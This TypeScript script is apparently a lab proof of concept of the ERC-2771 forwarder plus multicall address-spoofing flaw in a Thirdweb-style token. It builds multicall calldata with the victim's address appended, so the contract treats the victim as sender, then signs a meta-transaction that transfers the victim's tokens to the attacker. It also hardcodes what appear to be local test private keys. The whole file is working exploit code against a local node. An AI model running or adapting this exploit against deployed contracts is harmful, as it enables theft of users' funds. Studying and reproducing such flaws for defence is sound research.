import {ethers} from 'ethers';
import { metaTx, signMetaTx } from '../../libs/signMetaTransaction.lib';
import _forwarder from "../../artifacts/contracts/Hack/Thirdweb/TrustedForwarder.sol/TrustedForwarder.json";
import _erc20 from "../../artifacts/contracts/Hack/Thirdweb/Token.sol/MyToken.json";
import { etherToWei } from '../../libs/utils.lib';

async function sign() {
    // const VITCITM_PK = "0x503f38a9c967ed597e47fe25643985f032b072db8075426a92110f82df48dfcb" // remix address 1
    const ATTACKER__PK = "0x7e5bfb82febc4c2c8529167104271ceec190eafdca277314912eaabdb67c6e5f" // remix address 2
    const ForwarderCA = "0xd9145CCE52D386f254917e481eB44e9943F39138"
    const destination = "0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8"

    const provider = new ethers.providers.JsonRpcProvider("http:/\/127.0.0.1:8545");
    const Erc20 = new ethers.Contract(destination,_erc20.abi,provider)
    
    const victim = "0x5B38Da6a701c568545dCfcB03FcB875f56beddC4"
    const attacker = new ethers.Wallet(ATTACKER__PK,provider);

    const calldata = Erc20.interface.encodeFunctionData("multicall",[[
        Erc20.interface.encodeFunctionData("transfer",[attacker.address,etherToWei("1")]) + victim.replace("0x","")
    ]])
    console.log("Call Data : "+ calldata);
    
    const metaData:metaTx = {
        from:attacker.address,
        to:destination,
        value:0,
        gas:150_000,
        nonce:0,
        data:calldata
    }

    const sign = await signMetaTx(ForwarderCA,metaData,attacker)

    console.log(sign);
}


(() => {
    sign()
})()